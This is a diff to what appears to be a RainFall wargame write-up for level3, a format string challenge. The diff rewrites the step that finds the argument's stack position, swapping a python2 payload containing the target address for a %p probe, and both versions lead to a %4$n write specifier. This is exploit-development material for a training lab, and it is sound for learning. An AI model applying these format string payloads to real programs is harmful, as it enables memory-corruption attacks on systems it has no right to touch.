@@ -67,20 +67,19 @@ printf("%1$s %2$s", "November", "10");
 
 Output: November 10
 
-## Determining the Position of `&m` in the Stack
+## Determining the Position of our argument on the Stack
 
-We need to find the position of `the address of m` on the stack to use it as our positional parameter. By using `%1$x`,
-`%2$x`, etc., we create a string that includes `the address of m` in little-endian format and the values of the next
-four elements on the stack.
+To find the position of our argument on the stack, we can run the binary with a format string that prints several values
+from the stack.
 
 ```shell
-level3@RainFall ~ $ python2 -c 'print "\x8c\x98\x04\x08_AAAA_%1$x_%2$x_%3$x_%4$x"' > /tmp/m_position_finder
-level3@RainFall ~ $ ./level3 < /tmp/m_position_finder 
-�_AAAA_200_b7fd1ac0_b7ff37d0_804988c
+level3@RainFall ~ $ ./level3 
+AAAA.%p.%p.%p.%p.%p
+AAAA.0x200.0xf7f985c0.0x1000000.0x41414141.0x2e70252e
 ```
 
-We find the `address of m` (0x0804988c) at the 4th position on the stack. So we will use 4 as our positional parameter.
-Adding the positional specifier to the format parameter results in: `%4$n`.
+We can see that the 4th argument on the stack is 0x41414141 (which corresponds to AAAA in hexadecimal), so we will use
+4 as our positional parameter. Adding the positional specifier to the format parameter results in: `%4$n`.
 
 ## Calculating the number of characters needed 
 
